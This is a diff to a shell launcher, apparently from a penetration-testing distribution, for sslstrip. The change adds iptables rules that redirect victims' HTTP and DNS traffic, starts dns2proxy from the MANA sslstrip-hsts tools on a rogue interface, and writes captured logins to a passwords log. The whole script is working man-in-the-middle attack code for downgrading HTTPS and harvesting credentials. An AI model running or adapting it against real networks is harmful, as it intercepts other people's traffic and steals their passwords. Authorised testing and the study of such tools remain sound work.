@@ -11,14 +11,20 @@ require_ip=1
 f_clean_up(){
   printf "\n[!] Killing other instances of sslstrip and flushing iptables\n\n"
   killall sslstrip
+  # kill dns2proxy.py
+  dns2proxypid=`ps ax |grep dns2proxy |grep -v grep |awk '{print$1}'`
+  kill $dns2proxypid 
 
   # Remove SSL Strip iptables rule ONLY
   iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888
+  iptables -t nat -D PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
+
 }
 
 # Setup iptables for sslstrip
 f_ip_tables(){
   iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888
+  iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
 }
 
 f_run(){
@@ -34,7 +40,9 @@ f_run(){
 
   logfile=/opt/pwnix/captures/passwords/sslstrip_$(date +%F-%H%M).log
 
-  sslstrip -pfk -w $logfile  -l 8888 $interface &
+  cd /usr/src/mana/sslstrip-hsts
+  python /usr/src/mana/sslstrip-hsts/dns2proxy.py at0 &> /dev/null
+  /usr/bin/sslstrip -pfk -w $logfile  -l 8888 $interface &
 
   sleep 3
   printf "\n\n"
